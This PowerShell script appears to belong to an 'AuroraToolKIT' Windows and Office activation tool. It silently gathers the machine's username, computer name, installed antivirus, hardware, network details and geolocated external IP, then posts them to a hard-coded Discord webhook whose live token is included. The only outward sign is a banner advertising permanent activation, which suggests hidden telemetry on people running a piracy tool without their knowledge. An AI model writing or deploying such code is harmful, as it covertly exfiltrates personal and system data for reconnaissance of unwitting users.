$date = (Get-Date)
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$osVersion = "$($os.Caption) ($($os.OSArchitecture))"
$winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
    if (-not $winversion) {
        $winversion = $null
    }

$username = $env:USERNAME
$compName = $env:COMPUTERNAME
$language = (Get-Culture).Name

# Ambil antivirus yang terinstall
$antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct).displayName -join ", "
if (-not $antivirus) { $antivirus = "Not installed" }

# Ambil informasi CPU, GPU, RAM
$computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
$Manufacturer = $computerSystem.Vendor
$Type = $computerSystem.Version
$Model = $computerSystem.Name

$cpu = (Get-CimInstance Win32_Processor)
$Name = $cpu.Name
$Cores = $cpu.NumberOfCores
$LogicalProcessors = $cpu.NumberOfLogicalProcessors
$gpu = (Get-CimInstance Win32_VideoController).Name
$ramInfo = Get-WmiObject Win32_PhysicalMemory
$totalSizeInGB = 0
$ramDetails = @()
foreach ($ram in $ramInfo) {
    $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
    $totalSizeInGB += $sizeInGB
    $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
}
$TotalSizeInGB = $totalSizeInGB
$Modules = $ramDetails -join " -- "

$disks = Get-CimInstance -ClassName Win32_DiskDrive
$diskall = ""
foreach ($disk in $disks) {
    $modeldisk = $disk.Model
    $sizeInGB = [math]::round($disk.Size / 1GB, 2)
    $diskall += "-- $modeldisk - $sizeInGB GB`n"
}
$diskall | Out-Null

# Ambil status baterai
$battery = (Get-CimInstance Win32_Battery)
$batteryStatus = if ($battery) { "$($battery.EstimatedChargeRemaining)%" } else { "NoSystemBattery" }

# Ambil resolusi layar
Add-Type -AssemblyName System.Windows.Forms
$resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

# Ambil informasi jaringan
$gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
$ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"

$wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
if ($wifi) {
    $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
} else {
    $wifiName = "No Wi-Fi connected."
}
$lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
if ($lanAdapter) {
    $lanStatus = "LAN connected.: $($lanAdapter.Name)"
    $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
    if ($pingResult.StatusCode -eq 0) {
        $internetStatus = "Internet via LAN connected."
    } else {
        $internetStatus = "Internet via LAN is not connected."
    }
} else {
    $lanStatus = "No LAN connected."
    $internetStatus = "Internet via LAN is not available."
}

$WifiName = $wifiName
$LanStatus = $lanStatus
$InternetStatus = $internetStatus

# URL Webhook Discord
$webhookUrl = "https://discordapp.com/api/webhooks/1337473371004338216/eg9k89643pevgT6pc1nlWWARilOoFv5Fi5SKoE9J9-m_81W8k4me_wD_pAqU1U2e621g"

# URL Gambar dan Thumbnail
#$imageUrl = "https://.../preview.png"
#$thumbnailUrl = "https://.../preview.png"

# Buat payload JSON dengan format embed lengkap
$payload = @{
    username = "AuroraBot"
    #avatar_url = ""
    embeds = @(@{
        title = ":fox: AuroraToolKIT - System Report"
        description = ":key: **Activation Windows And Office Permanent**"
        color = 3447003
        fields = @(
            @{ name = ""; value = " $date `n`n"; inline = $false },
            @{ name = ":computer: **System**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
            @{ name = ":desktop: **Hardware**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n $diskall`n"; inline = $false },
            @{ name = ":globe_with_meridians: **Network**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)`n"; inline = $false }
        )
        #thumbnail = @{ url = $thumbnailUrl }
        #image = @{ url = $imageUrl }
        footer = @{ text = "AuroraBot | PowerShell Script" }
        timestamp = Get-Date -Format o
    })
} | ConvertTo-Json -Depth 10

# Kirim ke Discord Webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload

<#
color code
🔵 Biru	#3498DB	3447003
🔴 Merah	#E74C3C	15158332
🟢 Hijau	#2ECC71	3066993
🟡 Kuning	#F1C40F	16776960
🟠 Oranye	#FF9900	16753920
⚫ Hitam	#000000	0
⚪ Putih	#FFFFFF	16777215
💜 Ungu	#9B59B6	10181046
🧊 Cyan	#1ABC9C	1752220
#>
